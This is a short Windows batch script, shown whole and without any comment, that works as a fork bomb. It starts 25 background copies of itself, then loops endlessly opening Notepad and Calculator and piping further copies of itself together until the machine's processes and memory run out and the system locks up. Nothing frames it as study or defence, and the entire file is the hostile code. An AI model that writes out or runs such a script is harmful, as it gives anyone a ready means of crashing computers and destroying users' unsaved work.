@echo off
for /l %%i in (1,1,25) do start /b %0
:kill
start /b notepad
start /b calc
%0|%0|%0|%0
goto kill